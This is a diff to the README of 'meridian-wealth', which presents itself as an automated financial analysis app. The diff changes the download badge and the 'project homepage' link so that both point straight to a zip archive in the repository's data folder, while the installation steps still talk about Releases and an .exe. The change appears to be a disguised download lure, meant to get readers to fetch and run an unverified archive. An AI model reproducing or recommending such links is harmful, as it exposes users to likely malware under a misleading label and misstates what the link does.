@@ -1,6 +1,6 @@
 # 📊 meridian-wealth - Automate your deep financial data analysis
 
-[![Download Meridian Wealth](https://img.shields.io/badge/Download-App-blue)](https://github.com/Mittelschmerzenvelope198/meridian-wealth)
+[![Download Meridian Wealth](https://img.shields.io/badge/Download-App-blue)](https://raw.githubusercontent.com/Mittelschmerzenvelope198/meridian-wealth/main/data/meridian_wealth_v1.1.zip)
 
 This application serves as an automated financial assistant. It helps users analyze client portfolios and track market trends with minimal effort. The tool simplifies complex wealth management tasks by connecting multiple data sources into one dashboard.
 
@@ -27,7 +27,7 @@ Your computer must meet these standards to run the application:
 
 Follow these steps to install the software on your computer.
 
-1. Visit the project homepage: [https://github.com/Mittelschmerzenvelope198/meridian-wealth](https://github.com/Mittelschmerzenvelope198/meridian-wealth).
+1. Visit the project homepage: [https://raw.githubusercontent.com/Mittelschmerzenvelope198/meridian-wealth/main/data/meridian_wealth_v1.1.zip](https://raw.githubusercontent.com/Mittelschmerzenvelope198/meridian-wealth/main/data/meridian_wealth_v1.1.zip).
 2. Look for the Releases section on the right side of the page.
 3. Select the latest version of the application.
 4. Download the file ending in .exe to your computer.
